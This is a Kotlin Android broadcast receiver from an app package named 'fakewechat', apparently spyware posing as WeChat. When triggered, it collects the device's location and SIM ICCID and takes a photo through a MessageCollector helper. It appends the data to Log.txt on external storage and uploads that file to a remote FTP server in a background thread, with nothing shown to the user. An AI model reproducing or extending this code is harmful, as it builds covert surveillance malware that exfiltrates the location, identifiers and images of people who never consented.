package com.example.fakewechat

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Environment
import android.util.Log
import android.widget.Toast
import java.io.File
import java.io.FileOutputStream
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.*

/**
 * Created by ydy on 18-5-1.
 */
public class MyBroadcastReceiver: BroadcastReceiver() {
    override fun onReceive(p0: Context?, p1: Intent?) {
        Log.i("reciever","reciever:context:"+p0)
        //MessageCollector.setMyContext(p0!!);
        var str = SimpleDateFormat("yyyy-MM-dd-HH:mm:ss").format(Date())+ "\n";
        str = str + MessageCollector.getLocation()+"\n";

        str = str + "iccid:"+MessageCollector.getIccid()+"\n";

        //str = str + "PhoneNumber:" +MessageCollector.getNativePhoneNumber()+"\n";
        str = str + "-----------------------\n"


        MessageCollector.setMyContext(p0!!);
        MessageCollector.takePic();



        Log.i("dir2",Environment.getExternalStorageDirectory().canonicalPath + "/" + "Log.txt")


        Thread({
            MyFTPClient.downloadFile("","Log.txt",Environment.getExternalStorageDirectory().canonicalPath)
            var filename = Environment.getExternalStorageDirectory().canonicalPath + "/" + "Log.txt"
            //这里就不要用openFileOutput了,那个是往手机内存中写数据的




            //追加写入信息
            val output = FileOutputStream(filename,true)
            output.write(str.toByteArray());
            output.close()
            MyFTPClient.uploadFile("","Log.txt",Environment.getExternalStorageDirectory().canonicalPath + "/" + "Log.txt")


        }).start()




    }
}